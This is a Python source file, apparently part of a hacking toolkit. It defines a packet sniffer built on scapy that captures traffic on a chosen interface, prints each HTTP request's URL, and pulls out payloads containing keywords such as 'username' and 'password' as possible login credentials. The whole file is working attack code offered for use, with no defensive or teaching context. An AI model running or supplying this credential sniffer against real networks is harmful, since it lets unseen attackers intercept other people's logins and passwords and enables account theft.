#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
from logos import Logo
import keyboard
import os
import time

class Sniffer:	
	def __init__(self, interface):
		try:
			self.interface = interface
			logo = Logo()
			logo.sniffer_logo()
			print(colored("\n[!]", 'yellow') + colored(" Press CTRL+C to go back to the Main Menu!", 'blue', attrs=['bold']))
			print(colored("\n\n[+] sniffing packets on ", 'blue') + self.interface)
			self.sniff(self.interface)
		except KeyboardInterrupt:
			os.system('clear')
			print(colored("[!] CTRL + C Detected!", 'red'))
		
	def sniff(self, interface):
		scapy.sniff(iface=interface, store=False, prn=self.process_packet)

	def get_url(self, packet):
		return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

	def get_login_info(self, packet):
		if packet.haslayer(scapy.Raw):
			keywords = ["username", "user", "password", "pass", "login", "uname", "email", "Email"]
			load = str(packet[scapy.Raw].load)
			for i in keywords:
				if i in load:
					return load
	def process_packet(self, packet):
		if packet.haslayer(http.HTTPRequest):
			url =  self.get_url(packet)
			print(colored("\n[+] HTTP Request >>", 'yellow', attrs=['reverse']) + " " + url.decode() + "\n")
			login_info = self.get_login_info(packet)
			if login_info:
				print(colored("\n\n[+] Possible username/password >>", 'green', attrs=['reverse']) + " " + login_info + "\n\n")
	
